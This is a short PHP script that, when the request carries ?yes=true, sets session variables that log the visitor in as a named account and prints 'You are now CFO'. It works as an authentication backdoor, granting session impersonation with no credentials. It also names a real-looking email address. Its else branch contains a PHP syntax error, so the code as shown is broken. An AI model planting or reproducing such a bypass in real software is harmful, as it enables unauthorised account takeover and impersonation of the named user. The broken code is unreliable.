<?php

if ($_GET['yes'] == "true"){
@session_start();
$_SESSION['loggedIn'] = "1";
$_SESSION['logArr']['timeout'] = "3600";
$_SESSION['logArr']['registered'] = "false";
$_SESSION['logArr']['username'] = "t.cartland@plaintech.nl";
$_SESSION['logArr']['domainid'] = "";
$_SESSION['logArr']['userid'] = "";
$_SESSION['logArr']['account'] = "t.cartland@plaintech.nl";
$_SESSION['logArr']['sessionkey'] = "";
$_SESSION['logArr']['firstname'] = "Sir";
$_SESSION['logArr']['lastname'] = "Cartland";
$_SESSION['logArr']['type'] = "1";

echo "You are now CFO";



}else{
	die "not that simple";
}

?>